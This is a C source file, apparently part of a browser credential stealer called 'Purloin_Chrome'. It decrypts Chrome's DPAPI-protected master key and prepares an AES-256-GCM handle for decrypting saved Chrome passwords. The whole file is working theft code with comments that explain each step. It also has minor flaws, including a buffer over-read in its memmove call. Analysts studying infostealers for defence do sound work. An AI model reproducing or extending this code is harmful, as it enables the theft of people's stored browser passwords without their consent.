#include "includes/Purloin_Chrome.h"

// Decrypt the obtained master key. Decrypted byte form is stored on the [DATA_BLOB] blob_dec_masterkey 
BOOL decrypt_masterkey(PWCHAR enc_master_key, PCHAR char_master_key, WORD enc_char_master_key_size, DATA_BLOB* blob_dec_masterkey, PSTR buf_outMsg, DWORD buf_outSize) {
	/*
		Master key in the 'Local State' file is encoded in Base64, after decoding it into byte form, there will be 5 bytes of 'DPAPI' string to identify
		the encryption type of the Master key, DPAPI is the API provided by Windows to protect data (using CryptProtectData()). So 'DPAPI' is removed and then
		rest of the bytes are decrypted using CryptUnProtectData() funciton. And then
	*/

	errno_t err;

	/* Convert WCHAR form of Base64 encoded master key to CHAR */
	if ((err = wcstombs_s(NULL, char_master_key, enc_char_master_key_size * sizeof(CHAR), enc_master_key, (enc_char_master_key_size - 1) * sizeof(CHAR)))) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "wcstombs_s: Error when converting wchar master key to char master key, error: %d\n", err);)
			return FALSE;
	}
	/* Using above 'size_byte_master_key', a buffer is created to hold Byte form of Base64 encoded master key */
	BYTE* byte_master_key = NULL;
	DWORD size_byte_master_key;
	if (!base64_to_byte(char_master_key, &byte_master_key, &size_byte_master_key)) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "malloc: Error when allocating memory for byte master key\n");)
			return FALSE;
	}

	/* Move the bytes in 'byte_master_key' to left by 5 bytes. So the bytes of 'DPAPI' will be overwritten. */
	memmove(byte_master_key, byte_master_key + 5, size_byte_master_key);

	/* Decrypts the master key */
	if (!dpapi_decrypt(byte_master_key, size_byte_master_key - 5, blob_dec_masterkey)) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "CryptUnprotectData: Master key decryption failed.\n");)
			return FALSE;
	}

	free(byte_master_key);
	return TRUE;
}

// Use the decrypted master key to get a handle to the AES-GCM 256 decryption algorithm
BOOL get_decryption_handler(BCRYPT_KEY_HANDLE* p_handle_key, DATA_BLOB* blob_dec_masterkey, PSTR buf_outMsg, DWORD buf_outSize) {
	/*
		Chrome passwords are encrypted using AES-256-GCM encrypting algorithm (symetric). So Decrypting algorithm provider is opened and the returned resulting handle to actully
		decrypt passwords using that handle.
	*/

	BCRYPT_ALG_HANDLE handle_bcrypt_algorithm;											// Temporary Handle to Bcrypt ALG algorithm provider
	DWORD  bytesDone = 0;																// To hold size of byte form master key, to hold how many bytes used by Bcrypt 
	NTSTATUS bcryptStatus = 0;
	bcryptStatus = BCryptOpenAlgorithmProvider(&handle_bcrypt_algorithm, BCRYPT_AES_ALGORITHM, 0, 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "BCryptOpenAlgorithmProvider: Error getting BCrypt handle, error: %ld\n", bcryptStatus);)
			return FALSE;
	}
	bcryptStatus = BCryptSetProperty(handle_bcrypt_algorithm, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "BCryptSetProperty: Error setting BCrypt handle, error: %ld\n", bcryptStatus);)
			return FALSE;
	}
	BCRYPT_AUTH_TAG_LENGTHS_STRUCT authTagLengths;
	bcryptStatus = BCryptGetProperty(handle_bcrypt_algorithm, BCRYPT_AUTH_TAG_LENGTH, (BYTE*)&authTagLengths, sizeof(authTagLengths), &bytesDone, 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "BCryptGetProperty: Error getting BCrypt handle, BCRYPT_AUTH_TAG_LENGTH, error: %ld\n", bcryptStatus);)
			return FALSE;
	}
	DWORD blockLength = 0;
	bcryptStatus = BCryptGetProperty(handle_bcrypt_algorithm, BCRYPT_BLOCK_LENGTH, (BYTE*)&blockLength, sizeof(blockLength), &bytesDone, 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "BCryptGetProperty: Error getting BCrypt handle, BCRYPT_BLOCK_LENGTH, error: %ld\n", bcryptStatus);)
			return FALSE;
	}
	bcryptStatus = BCryptGenerateSymmetricKey(handle_bcrypt_algorithm, p_handle_key, 0, 0, blob_dec_masterkey->pbData, blob_dec_masterkey->cbData, 0);
	if (!BCRYPT_SUCCESS(bcryptStatus)) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "BCryptGenerateSymmetricKey: Error generating Symetric key, error: %ld\n", bcryptStatus);)
			return FALSE;
	}

	return TRUE;
}